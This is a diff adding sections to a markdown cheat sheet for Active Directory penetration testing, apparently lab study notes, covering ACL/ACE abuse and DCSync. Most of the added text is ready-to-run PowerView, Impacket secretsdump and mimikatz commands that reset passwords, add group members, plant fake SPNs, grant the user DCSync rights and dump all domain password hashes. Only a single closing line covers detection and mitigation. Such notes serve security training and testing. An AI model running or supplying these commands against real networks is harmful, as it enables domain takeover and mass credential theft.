@@ -257,6 +257,59 @@ If that account is privileged (or `admincount=1`), you may jump straight toward 
 
 > Kerberoast is the "any domain user" attack — the moment you have one foothold credential, run it. `/ldapfilter:'admincount=1'` focuses on the accounts whose crack actually matters.
 
+## ACL / ACE Abuse (detail)
+AD objects have DACLs; a misassigned right over another object is a privilege-escalation edge. **BloodHound draws these as edges** ("`wley` has GenericWrite over `svc_acct`") — that's usually how you find them. PowerView enumerates/abuses them.
+
+**Abusable rights → what you can do:**
+| Right over target | Abuse |
+|---|---|
+| **ForceChangePassword** | reset the target's password |
+| **GenericAll** | full control (reset pw, add to group, RBCD, targeted Kerberoast) |
+| **GenericWrite / WriteProperty** | set attributes — e.g. add an SPN → Kerberoast, or set `member` |
+| **AddMember / AddSelf** | add a principal (yourself) to a group |
+| **WriteOwner** | make yourself owner → then WriteDACL |
+| **WriteDACL** | grant yourself any right (e.g. DCSync) |
+| **AllExtendedRights** | includes ForceChangePassword, and on the domain → DCSync |
+
+**Enumerate:**
+```powershell
+Import-Module .\PowerView.ps1
+Find-InterestingDomainAcl -ResolveGUIDs
+# what rights does a SID I control have?
+$sid = Convert-NameToSid <user>
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+```
+
+**Abuse primitives:**
+```powershell
+Set-DomainUserPassword -Identity <t> -AccountPassword (ConvertTo-SecureString '<pw>' -AsPlainText -Force)   # ForceChangePassword
+Add-DomainGroupMember -Identity '<group>' -Members <me>                                   # AddMember
+Set-DomainObject -Identity <t> -Set @{serviceprincipalname='fake/spn'}                    # GenericWrite → then Kerberoast
+Set-DomainObjectOwner -Identity <t> -OwnerIdentity <me>                                   # WriteOwner
+Add-DomainObjectAcl -TargetIdentity "DC=<d>,DC=local" -PrincipalIdentity <me> -Rights DCSync   # WriteDACL → DCSync
+```
+> Chains matter: WriteOwner → WriteDACL → grant self DCSync → dump the domain. BloodHound shows the whole chain; PowerView executes each hop.
+
+## DCSync (detail)
+Impersonate a DC and pull hashes via replication. Needs **DS-Replication-Get-Changes** + **-Get-Changes-All** (DA/EA by default, or granted via the ACL chain above).
+```powershell
+# confirm my user has the rights
+$sid = (Convert-NameToSid <user>)
+Get-ObjectAcl "DC=<d>,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get' -and $_.SecurityIdentifier -match $sid}
+```
+```bash
+# Linux — Impacket
+secretsdump.py -just-dc INLANEFREIGHT/<user>@<DC>                 # all hashes
+secretsdump.py -just-dc-user administrator INLANEFREIGHT/<user>@<DC>   # one user
+secretsdump.py -just-dc -history INLANEFREIGHT/<user>@<DC>        # incl. password history
+```
+```text
+# Windows — mimikatz (run as the privileged user: runas /netonly)
+privilege::debug
+lsadump::dcsync /domain:<d> /user:<DOMAIN>\administrator
+```
+Grab **krbtgt** → Golden Ticket. **Detect/mitigate:** Event ID 4662; replication rights to DCs only; least privilege; rotate krbtgt.
+
 ## AD attack flow (reference)
 Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).
 
